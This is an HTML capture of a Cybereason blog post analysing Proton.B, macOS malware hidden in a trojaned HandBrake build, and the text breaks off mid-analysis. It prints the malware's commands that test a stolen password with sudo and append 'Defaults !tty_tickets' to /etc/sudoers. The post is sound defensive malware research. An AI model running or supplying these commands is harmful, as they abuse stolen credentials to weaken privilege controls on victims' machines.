<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Amit Serper">
    <meta name="description" content="Cybereason Labs looks at what this variant, Proton.B, actually does after it’s executed and includes insights obtained from reverse engineering the malware.">
    <meta name="generator" content="HubSpot">
    <title>Proton.B: What this Mac malware actually does</title>
    <link rel="shortcut icon" href="https://www.cybereason.com/hubfs/favicon-1.ico">
    

    <script src="/hs/hsstatic/jquery-libs/static-1.4/jquery/jquery-1.11.2.js"></script>
<script>hsjQuery = window['jQuery'];</script>
    <meta property="og:description" content="Cybereason Labs looks at what this variant, Proton.B, actually does after it’s executed and includes insights obtained from reverse engineering the malware.">
    <meta property="og:title" content="Proton.B: What this Mac malware actually does">
    <meta name="twitter:description" content="Cybereason Labs looks at what this variant, Proton.B, actually does after it’s executed and includes insights obtained from reverse engineering the malware.">
    <meta name="twitter:title" content="Proton.B: What this Mac malware actually does">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41681847227/1619109182781/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41682410610/1618194603032/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/43300360745/1617857458537/module_43300360745_CR_-_Malicious_Life_Network_--_Related_Posts.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/34473990280/1617772255567/module_34473990280_CR_-_Footer_Full__en_US.min.css">
    

    
<!--  Added by GoogleAnalytics integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create','UA-56367941-1','auto');
  ga('send','pageview');
}}]);
</script>

<!-- /Added by GoogleAnalytics integration -->

<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || []; _hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TJVVB7C');
}}]);
</script>

<!-- /Added by GoogleTagManager integration -->


<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://use.typekit.net/vyv2ljd.js"></script>
<script>try{Typekit.load({ async: false });}catch(e){}</script>
<link rel="amphtml" href="https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does?hs_amp=true">

<meta property="og:image" content="https://www.cybereason.com/hubfs/Blog%20Images%20-%20Labs/proton%20B/shutterstock_383381101-1.jpg#keepProtocol">

<meta name="twitter:image" content="https://www.cybereason.com/hubfs/Blog%20Images%20-%20Labs/proton%20B/shutterstock_383381101-1.jpg#keepProtocol">


<meta property="og:url" content="https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does">
<meta name="twitter:card" content="summary">
<meta name="twitter:creator" content="@0xAmit">

<link rel="canonical" href="https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cybereason.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cybereason.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/7052064/hub_generated/template_assets/1621526769050/hubspot/hubspot_default/shared/responsive/layout.min.css">


<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/34470223313/1613710752320/__CR_Web_Platform_2020/CSS/cr-master__cta.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/34470477360/1621270587578/__CR_Web_Platform_2020/CSS/cr-master__main.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/35275979682/1600880367101/__CR_Web_Platform_2020/CSS/ionicons.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42760289143/1621016677351/__CR_Web_Platform_2020/CSS/cr-mln__build.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/34470224480/1614969030468/__CR_Web_Platform_2020/CSS/bulma/cr-framework__bulma-columns.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/35291999472/1614661129976/__CR_Web_Platform_2020/CSS/bulma/cr-framework__bulma.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42363645447/1614911253070/__CR_Web_Platform_2020/CSS/hamburger-animation.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42507091846/1614920868925/__CR_Web_Platform_2020/CSS/animate.min.min.css">


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="/hubfs/dam/plugins/marker-animation.js"></script>
<script>
$(document).ready(function() {
  $('.highlight').markerAnimation({
    "color":'#FFC628',
    "font_weight":'normal',
    "background-size": '200% 1.2em'
  });
});
</script>

    

</head>
<body class="   hs-content-id-5283507430 hs-blog-post hs-blog-id-5272851739" style="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TJVVB7C" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433790649568" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section id="cr-malicious-life-network__tier-one-header">
  <div class="#">
    <div id="logo"><a href="https://www.cybereason.com"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-logo-web-horizontal-black-500px.png"></a></div>
    <div id="back-to">
      <a href="https://www.cybereason.com">Back to <span>Cybereason.com</span></a>
    </div>
    <!-- Hamburger Menu -->
    <button class="hamburger hamburger--collapse" type="button">
      <span class="hamburger-box">
        <span class="hamburger-inner"></span>
      </span>
    </button>
    <div class="cr-mln__hamburger-menu--overlay">
      <ul>
        <li><a href="https://www.cybereason.com/blog/all">All Posts</a></li>
        <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
        <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
        <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
        <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
        <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
        <li><a href="/blog/category/news">News</a></li>
      </ul>
      <div class="subscribe">
        <a href="#blog-subscribe">Subscribe</a>
      </div>
    </div>
    <!-- -->
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget mln-homepage" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433785464566" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__hero-main base">
  <div class="container-is-blog columns hero-content page-center">
    <div class="column is-5-fullhd is-5-desktop is-12-touch">
      <a href="/blog"><img class="cr-mln-logo" src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-malicious-life-network-logo.svg"></a>
    </div>
    <div class="column is-7-fullhd is-7-desktop is-hidden-mobile is-hidden-tablet-only">
      <div class="cr-mln__search-subscribe">
        <div class="cr-mln__search">
          <a href="#cr-search-modal" class="search-btn"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-blog-icon--search-dark-gray.png" alt="Search"></a>
        </div>
        <div class="cr-mln__subscribe">
          <a class="btn-subscribe" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>
      <div class="cr-mln__category-nav">
        <ul>
          <li><a href="https://www.cybereason.com/blog/all"><span class="underline">All</span></a></li>
          <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
          <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
          <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
          <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
          <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
          <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
        </ul>
      </div>
    </div>
  </div>
      <!-- MOBILE Search and Subscribe -->
      <div class="container-is-blog columns is-gapless is-hidden-desktop cr-mln__search-subscribe--mobile">
        <div class="column">
          <a class="search-btn">Search</a>
        </div>
        <div class="column">
          <a class="#" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>

      <!-- END MOBILE Search and Subscribe -->
  
  <!-- SEARCH Modal Wrap -->

  <div id="cr-search-modal">
        <!--THIS IS IMPORTANT! to close the modal, the class name has to match the name given on the ID -->
        <div id="btn-close-modal" class="close-cr-search-modal"> 
            X
        </div>

        <div class="modal-content">
            <div class="container columns">
              <div class="column">
                <div class="cr-search-modal__search-bar">
                  <h3>Search</h3>
                  <form action="/hs-search-results">
                    <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search...">
                    <input type="hidden" name="type" value="BLOG_POST">
                    <input type="hidden" name="type" value="LISTING_PAGE">
                    <button type="submit" class="arrow"></button>
                  </form>
                  
                </div>

              </div>
          </div>
        </div>
    </div>
  <!-- END Search Modal Wrap -->

</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-blog_content " style="" data-widget-type="blog_content" data-x="0" data-w="12">






<div class="cr-mln__blog-post">
  <div class="container-is-blog columns is-multiline page-center">
    <div class="column is-2-fullhd is-2-desktop is-10-tablet is-hidden-mobile cr-mln__post-author-share">
      &nbsp;
    </div>
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-offset-1-tablet">
      <div class="featured-image"><img src="https://www.cybereason.com/hubfs/Blog%20Images%20-%20Labs/proton%20B/shutterstock_383381101-1.jpg" alt=""></div>
      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Proton.B: What this Mac malware actually does</span></h1>
      <p class="date-and-duration">
        <span class="publish-date">May 10, 2017 |</span>
        <span class="read-time">
          
          
          
          
          
          6 minute read
          
        </span>
      </p>
    </div>
    
    <!-- Sticky Author and Social Box -->
    
    <!-- END Sticky Author and Social Box -->
      <div class="container-is-blog columns is-multiline page-center cr-mln__blog-post--body">
        
        <div class="column is-2-fullhd is-2-desktop is-10-tablet is-12-mobile is-offset-1-tablet is-offset-1-mobile cr-mln__post-author-share">
         <div id="hubspot-author_data" class="hubspot-editable cr-mln__post-meta" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
            
              <span class="descriptor">Written By</span>
              <p><span class="author">Amit Serper</span></p>
             
          </div>
          <div class="cr-blog-post__social-sharing">
            <div id="hs_cos_wrapper_module_161724375084957" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-social_sharing" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">






<div class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_social_sharing" data-hs-cos-general-type="widget" data-hs-cos-type="social_sharing">
  
	
  
    
    
    
			
		

    <a href="https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does&amp;utm_medium=social&amp;utm_source=twitter&amp;url=https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does&amp;utm_medium=social&amp;utm_source=twitter&amp;source=tweetbutton&amp;text=" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on twitter">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does&amp;utm_medium=social&amp;utm_source=facebook" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on facebook">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does&amp;utm_medium=social&amp;utm_source=linkedin" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on linkedin">
    </a>
	

</div></div>
          </div> 
        </div>
        <div class="column is-8-fullhd is-8-desktop is-10-tablet is-10-mobile is-offset-0-fullhd is-offset-0-desktop is-offset-1-tablet is-offset-1-mobile">
          <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><span style="font-weight: 400;">Over the weekend I downloaded a sample of the trojaned HandBrake software (Thanks Patrick Wardle at </span><a href="https://objective-see.com/blog.html" target="_blank" rel="noopener noreferrer"><span style="font-weight: 400;">Objective-See</span></a><span style="font-weight: 400;">). In case you missed it, hackers added a new variant of </span><span style="font-weight: 400;">the Proton remote access tool to the very popular video encoding application. Proton, which targets macOS, does all kinds of nasty behavior, </span><span style="font-weight: 400;">including stealing passwords, keylogging, exfiltrating files and enabling remote access log-in. For more information on Proton, check out this </span><a href="https://www.cybersixgill.com/proton-a-new-mac-os-rat/" target="_blank" rel="noopener noreferrer"><span style="font-weight: 400;">report</span></a><span style="font-weight: 400;"> from Sixgill.</span></p>
<!--more-->
<p><span style="font-weight: 400;">In </span><a href="https://objective-see.com/blog/blog_0x1D.html" target="_blank" rel="noopener noreferrer"><span style="font-weight: 400;">his blog</span></a><span style="font-weight: 400;">, Patrick does a great job of explaining how attackers added Proton into HandBrake, a popular media-encoding app, so I’m not going to discuss that. Instead, I'll look at what this variant, Proton.B, actually does after it’s executed and includes insights obtained from reverse engineering the malware. Proton’s authors included a few tricks meant to deceive researchers (like contacting an external service to obtain the date and time and encrypting some of the strings and scripts and storing them in a separate file that will be decrypted upon execution).</span></p>
<h2><strong>How OSX/Proton actually works</strong></h2>
<p><span style="font-weight: 400;">The malicious file we’re dealing with is named activity_agent. When looking at activity_agent with a disassembler, it’s clear to see that it was developed in Objective-C, which is macOS’ ‘native’ programming language, unlike other malware that’s written in C++ and uses other “cross platform solutions” such as QT.</span></p>
<p>When going through the binary with IDA Pro, I could see a lot of interesting things such as SSH tunneling capabilities. Sadly, I did not see this behavior when I was examining the malware.</p>
<p><a href="https://cdn2.hubspot.net/hubfs/3354902/Imported_Blog_Media/image4-1.png"><img class="alignnone wp-image-8775" src="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image4-1.png?width=671&amp;height=358&amp;name=image4-1.png" alt="" width="671" height="358" srcset="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image4-1.png?width=336&amp;height=179&amp;name=image4-1.png 336w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image4-1.png?width=671&amp;height=358&amp;name=image4-1.png 671w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image4-1.png?width=1007&amp;height=537&amp;name=image4-1.png 1007w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image4-1.png?width=1342&amp;height=716&amp;name=image4-1.png 1342w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image4-1.png?width=1678&amp;height=895&amp;name=image4-1.png 1678w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image4-1.png?width=2013&amp;height=1074&amp;name=image4-1.png 2013w" sizes="(max-width: 671px) 100vw, 671px"></a></p>
<p><span style="font-weight: 400;">Once the file is executed, it decrypts a file called </span><i><span style="font-weight: 400;">“.hash”</span></i><span style="font-weight: 400;"> that is located in the bundle’s Resources directory.</span></p>
<p><img class="alignnone wp-image-8776" src="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image6-3.png?width=655&amp;height=368&amp;name=image6-3.png" alt="" width="655" height="368" srcset="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image6-3.png?width=328&amp;height=184&amp;name=image6-3.png 328w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image6-3.png?width=655&amp;height=368&amp;name=image6-3.png 655w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image6-3.png?width=983&amp;height=552&amp;name=image6-3.png 983w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image6-3.png?width=1310&amp;height=736&amp;name=image6-3.png 1310w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image6-3.png?width=1638&amp;height=920&amp;name=image6-3.png 1638w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image6-3.png?width=1965&amp;height=1104&amp;name=image6-3.png 1965w" sizes="(max-width: 655px) 100vw, 655px"></p>
<p><span style="font-weight: 400;">This file contains a large subset of strings that will then be loaded by </span><i><span style="font-weight: 400;">activity_monitor</span></i><span style="font-weight: 400;"> binary. This is simply a method of hiding the strings from researchers and antivirus software.</span></p>
<p><span style="font-weight: 400;">When decrypted, </span><i><span style="font-weight: 400;">“.hash” </span></i><span style="font-weight: 400;">contains the following data:</span></p>
<p><img class="alignnone wp-image-8784" src="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%205.png?width=865&amp;name=asset%205.png" alt="asset 5.png" width="865" data-originalsrc="https://www.cybereason.com/wp-content/uploads/2017/05/Screen-Shot-2017-05-10-at-5.37.10-PM.png" title="asset 5.png" caption="false" data-constrained="true" style="width: 865px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%205.png?width=433&amp;name=asset%205.png 433w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%205.png?width=865&amp;name=asset%205.png 865w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%205.png?width=1298&amp;name=asset%205.png 1298w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%205.png?width=1730&amp;name=asset%205.png 1730w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%205.png?width=2163&amp;name=asset%205.png 2163w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%205.png?width=2595&amp;name=asset%205.png 2595w" sizes="(max-width: 865px) 100vw, 865px"><img class="alignnone wp-image-8786" src="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%206.png?width=867&amp;name=asset%206.png" alt="asset 6.png" width="867" data-originalsrc="https://www.cybereason.com/wp-content/uploads/2017/05/Screen-Shot-2017-05-10-at-5.37.21-PM.png" title="asset 6.png" caption="false" data-constrained="true" style="width: 867px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%206.png?width=434&amp;name=asset%206.png 434w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%206.png?width=867&amp;name=asset%206.png 867w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%206.png?width=1301&amp;name=asset%206.png 1301w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%206.png?width=1734&amp;name=asset%206.png 1734w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%206.png?width=2168&amp;name=asset%206.png 2168w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%206.png?width=2601&amp;name=asset%206.png 2601w" sizes="(max-width: 867px) 100vw, 867px"><img class="alignnone wp-image-8787" src="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/Screen-Shot-2017-05-10-at-5_37_29-PM-1.png?width=850&amp;height=892&amp;name=Screen-Shot-2017-05-10-at-5_37_29-PM-1.png" alt="" width="850" height="892" srcset="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/Screen-Shot-2017-05-10-at-5_37_29-PM-1.png?width=425&amp;height=446&amp;name=Screen-Shot-2017-05-10-at-5_37_29-PM-1.png 425w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/Screen-Shot-2017-05-10-at-5_37_29-PM-1.png?width=850&amp;height=892&amp;name=Screen-Shot-2017-05-10-at-5_37_29-PM-1.png 850w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/Screen-Shot-2017-05-10-at-5_37_29-PM-1.png?width=1275&amp;height=1338&amp;name=Screen-Shot-2017-05-10-at-5_37_29-PM-1.png 1275w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/Screen-Shot-2017-05-10-at-5_37_29-PM-1.png?width=1700&amp;height=1784&amp;name=Screen-Shot-2017-05-10-at-5_37_29-PM-1.png 1700w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/Screen-Shot-2017-05-10-at-5_37_29-PM-1.png?width=2125&amp;height=2230&amp;name=Screen-Shot-2017-05-10-at-5_37_29-PM-1.png 2125w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/Screen-Shot-2017-05-10-at-5_37_29-PM-1.png?width=2550&amp;height=2676&amp;name=Screen-Shot-2017-05-10-at-5_37_29-PM-1.png 2550w" sizes="(max-width: 850px) 100vw, 850px"></p>
<p><span style="font-weight: 400;">As we can clearly see by the use of “</span><i><span style="font-weight: 400;">%@</span></i><span style="font-weight: 400;">”, this is Objective-C syntax, </span><i><span style="font-weight: 400;">NSSTRING</span></i><span style="font-weight: 400;"> to be exact. In Objective-C “</span><i><span style="font-weight: 400;">%@</span></i><span style="font-weight: 400;">” is used for </span><a href="https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html"><span style="font-weight: 400;">string formatting</span></a><span style="font-weight: 400;">.</span></p>
<p><span style="font-weight: 400;">When this file is being executed, what appears to be a legitimate dialog box appears and asks for the user’s password in order to install some “additional codecs.” But the</span> <span style="font-weight: 400;">text in the dialog box is actually in the contents of the decrypted “.hash” file.</span></p>
<p><img class="alignnone wp-image-8777" src="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%208.png?width=438&amp;name=asset%208.png" alt="asset 8.png" width="438" data-originalsrc="https://www.cybereason.com/wp-content/uploads/2017/05/image3.png" title="asset 8.png" caption="false" data-constrained="true" style="width: 438px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%208.png?width=219&amp;name=asset%208.png 219w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%208.png?width=438&amp;name=asset%208.png 438w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%208.png?width=657&amp;name=asset%208.png 657w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%208.png?width=876&amp;name=asset%208.png 876w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%208.png?width=1095&amp;name=asset%208.png 1095w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%208.png?width=1314&amp;name=asset%208.png 1314w" sizes="(max-width: 438px) 100vw, 438px"></p>
<p><strong>Note: The text in that dialog box appears in the contents of the decrypted “.hash” file.</strong></p>
<p><span style="font-weight: 400;">Mac users should always think twice before entering their password into every dialog box. Dialog boxes asking for passwords are a very popular social engineering tactic designed to trick users into giving attackers their passwords. We’ve seen this method used in other malware attacks. It can be done with installers (like in the case of </span><a href="https://www.cybereason.com/cybereason-labs-analysis-the-minds-behind-the-osx-pirrit/" target="_blank" rel="noopener noreferrer"><span style="font-weight: 400;">OSX/Pirrit</span></a><span style="font-weight: 400;">), with Applescript or, like in this case, by simply creating a dialog box that fits the story. Since the user is in the sudoers list as in most Mac environments, knowing the user’s password is enough to escalate privileges to root.</span></p>
<p>Once users type in their password, the malware immediately starts to check if it is working by executing the following command:</p>
<p><i><span style="font-weight: 400;">'/bin/sh', '-c', "echo 'qwer1234' | sudo -S echo success;"</span></i></p>
<p><span style="font-weight: 400;">The next step in that process is to disable the ‘tty_tickets’ flag in /etc/sudoers by executing the following command:</span></p>
<p><a href="https://static.hsstatic.net/BlogImporterAssetsUI/ex/missing-image.png" data-originalsrc="https://www.cybereason.com/wp-content/uploads/2017/05/image7.png"><img class="alignnone size-full wp-image-8778" src="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%209.png?width=1651&amp;name=asset%209.png" alt="asset 9.png" width="1651" data-originalsrc="https://www.cybereason.com/wp-content/uploads/2017/05/image7.png" title="asset 9.png" caption="false" data-constrained="true" style="width: 1651px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%209.png?width=826&amp;name=asset%209.png 826w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%209.png?width=1651&amp;name=asset%209.png 1651w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%209.png?width=2477&amp;name=asset%209.png 2477w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%209.png?width=3302&amp;name=asset%209.png 3302w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%209.png?width=4128&amp;name=asset%209.png 4128w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%209.png?width=4953&amp;name=asset%209.png 4953w" sizes="(max-width: 1651px) 100vw, 1651px"></a></p>
<p><i><span style="font-weight: 400;">'/bin/sh', '-c', 'echo \'printf "\\033[8;1;1t"; echo "</span></i><span style="color: #ff0000;"><strong><i>qwer1234</i></strong></span><i><span style="font-weight: 400;">" | sudo -S sh -c "echo \'Defaults !tty_tickets\' &gt;&gt; /etc/sudoers"; killall Terminal; sleep 1;\'</span></i></p>
